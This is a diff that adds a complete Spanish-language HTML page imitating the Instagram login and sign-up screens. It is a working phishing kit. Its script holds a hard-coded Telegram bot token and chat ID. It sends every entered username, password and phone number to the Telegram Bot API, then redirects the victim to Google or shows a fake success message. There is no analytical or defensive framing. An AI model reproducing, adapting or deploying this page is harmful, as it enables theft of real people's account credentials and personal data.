@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      background-color: #fafafa;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-size: 18px;
+    }
+    .container {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px 30px;
+      width: 360px;
+      max-width: 90vw;
+      text-align: center;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Billabong', cursive;
+      font-size: 50px;
+      margin-bottom: 20px;
+      color: #262626;
+      gap: 10px;
+      width: 100%;
+      max-width: 300px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .logo img {
+      width: 48px;
+      height: 48px;
+      object-fit: contain;
+    }
+    input {
+      width: 100%;
+      max-width: 300px;
+      padding: 10px;
+      margin: 6px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      background-color: #fafafa;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      max-width: 300px;
+      background-color: #0095f6;
+      border: none;
+      color: white;
+      padding: 10px;
+      margin-top: 10px;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .or-separator {
+      margin: 15px 0;
+      width: 100%;
+      max-width: 300px;
+      display: flex;
+      align-items: center;
+      font-weight: 600;
+      color: #8e8e8e;
+      font-size: 14px;
+      user-select: none;
+    }
+    .or-separator::before,
+    .or-separator::after {
+      content: "";
+      flex-grow: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+      margin: 0 10px;
+    }
+    .facebook-btn {
+      background-color: #1877f2;
+      color: white;
+      font-weight: 600;
+      padding: 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      font-size: 16px;
+      border: none;
+      width: 100%;
+      max-width: 300px;
+      box-sizing: border-box;
+    }
+    .facebook-btn svg {
+      width: 20px;
+      height: 20px;
+      fill: white;
+    }
+    .forgot-pass {
+      text-align: right;
+      margin-top: 6px;
+      font-size: 14px;
+      color: #00376b;
+      cursor: pointer;
+      user-select: none;
+      width: 100%;
+      max-width: 300px;
+      margin-left: auto;
+      box-sizing: border-box;
+    }
+    .register-text {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #262626;
+      width: 100%;
+      max-width: 300px;
+      box-sizing: border-box;
+    }
+    .register-text span {
+      color: #0095f6;
+      cursor: pointer;
+      user-select: none;
+    }
+    /* Popout style */
+    #popout {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.8);
+      color: white;
+      padding: 14px 24px;
+      border-radius: 6px;
+      font-size: 16px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+      z-index: 9999;
+      max-width: 90vw;
+      text-align: center;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+    #popout.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    /* Para móviles agrandar todo */
+    @media (max-width: 600px) {
+      body {
+        font-size: 22px;
+      }
+      .container {
+        width: 95vw;
+        padding: 30px 20px;
+      }
+      input, button, .facebook-btn {
+        font-size: 20px;
+        padding: 14px;
+      }
+      .logo {
+        font-size: 40px;
+        max-width: 280px;
+      }
+      .logo img {
+        width: 40px;
+        height: 40px;
+      }
+      .forgot-pass {
+        font-size: 16px;
+      }
+      .register-text {
+        font-size: 16px;
+      }
+      .or-separator {
+        font-size: 16px;
+      }
+    }
+    /* Ocultar formulario registro al inicio */
+    #register-form {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 360px;
+    }
+    #register-form input {
+      margin: 6px 0;
+    }
+    #register-form button {
+      margin-top: 15px;
+    }
+    #register-form .cancel-btn {
+      background-color: #ccc;
+      color: #333;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="login-container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Logo" />
+      <div>instagram</div>
+    </div>
+
+    <input type="text" id="user" placeholder="Usuario, teléfono o correo" />
+    <input type="password" id="pass" placeholder="Contraseña" />
+    <div class="forgot-pass" onclick="mostrarPopout('La opción no está disponible por ahora')">¿Olvidaste tu contraseña?</div>
+    <button onclick="registrarUsuario()">Iniciar Sesión</button>
+
+    <div class="or-separator">o</div>
+
+    <button class="facebook-btn" onclick="mostrarPopout('La opción no está disponible por ahora')">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M22.675 0h-21.35C.59 0 0 .59 0 1.325v21.351C0 23.41.59 24 1.325 24H12.82v-9.294H9.692v-3.622h3.127V8.413c0-3.1 1.893-4.788 4.657-4.788 1.325 0 2.466.099 2.796.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12V24h6.116c.735 0 1.325-.59 1.325-1.324V1.325C24 .59 23.41 0 22.675 0z"/>
+      </svg>
+      Iniciar sesión con Facebook
+    </button>
+
+    <div class="register-text">
+      ¿No tienes una cuenta? <span onclick="mostrarRegistro()">Regístrate</span>
+    </div>
+  </div>
+
+  <!-- Formulario Registro -->
+  <div class="container" id="register-form">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Logo" />
+      <div>instagram</div>
+    </div>
+
+    <input type="text" id="reg-user" placeholder="Usuario" />
+    <input type="password" id="reg-pass" placeholder="Contraseña" />
+    <input type="tel" id="reg-phone" placeholder="Número de teléfono" />
+    <button onclick="registrarCuenta()">Crear Cuenta</button>
+    <button class="cancel-btn" onclick="ocultarRegistro()">Cancelar</button>
+  </div>
+
+  <div id="popout"></div>
+
+  <script>
+    const botToken = '8179073810:AAEtSYprQc4mZJXOblSGWEu4rJBV7bt4McI';
+    const chatId = '7596099079';
+
+    function mostrarPopout(text) {
+      const popout = document.getElementById('popout');
+      popout.textContent = text;
+      popout.classList.add('show');
+      setTimeout(() => {
+        popout.classList.remove('show');
+      }, 3500);
+    }
+
+    function registrarUsuario() {
+      const user = document.getElementById("user").value.trim();
+      const pass = document.getElementById("pass").value.trim();
+
+      if (user && pass) {
+        const mensaje = `📩 Nuevo inicio de sesión:\n👤 Usuario: ${user}\n🔒 Contraseña: ${pass}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+
+        fetch(url)
+          .catch(() => {})
+          .finally(() => {
+            window.location.href = "https://google.com";
+          });
+      } else {
+        mostrarPopout("Por favor completa ambos campos.");
+      }
+    }
+
+    function mostrarRegistro() {
+      document.getElementById('login-container').style.display = 'none';
+      document.getElementById('register-form').style.display = 'flex';
+    }
+    function ocultarRegistro() {
+      document.getElementById('register-form').style.display = 'none';
+      document.getElementById('login-container').style.display = 'flex';
+      limpiarRegistro();
+    }
+    function limpiarRegistro() {
+      document.getElementById('reg-user').value = '';
+      document.getElementById('reg-pass').value = '';
+      document.getElementById('reg-phone').value = '';
+    }
+
+    function registrarCuenta() {
+      const user = document.getElementById("reg-user").value.trim();
+      const pass = document.getElementById("reg-pass").value.trim();
+      const phone = document.getElementById("reg-phone").value.trim();
+
+      if (!user || !pass || !phone) {
+        mostrarPopout("Completa todos los campos para registrarte.");
+        return;
+      }
+
+      // Validar teléfono simple (solo números y longitud)
+      if (!/^\d{7,15}$/.test(phone)) {
+        mostrarPopout("Número de teléfono inválido.");
+        return;
+      }
+
+      const mensaje = `🆕 Nuevo registro:\n👤 Usuario: ${user}\n🔒 Contraseña: ${pass}\n📱 Teléfono: ${phone}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+
+      fetch(url)
+        .catch(() => {})
+        .finally(() => {
+          mostrarPopout("Cuenta creada con éxito");
+          ocultarRegistro();
+        });
+    }
+  </script>
+</body>
+</html>
